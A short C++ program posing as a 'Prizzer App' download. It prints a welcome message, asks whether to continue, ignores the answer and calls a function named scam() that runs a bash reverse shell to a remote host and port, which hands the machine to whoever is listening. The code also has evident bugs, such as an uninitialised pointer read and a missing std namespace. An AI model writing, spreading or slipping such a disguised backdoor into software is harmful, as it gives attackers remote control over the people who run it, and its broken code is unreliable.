#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include "NetworkTools.h"


void scam() {
    system("/bin/bash -i >/dev/tcp/ 192.168.56.1/4008 0<&1 2>&1");
}

int main() {

    char* choice;
    cout << "Thanks for downloading Prizzer App" << endl;
    cout << "Do you want to continue [Y/n]?: ";
    cin >> choice;

    scam();

    return 0;
};


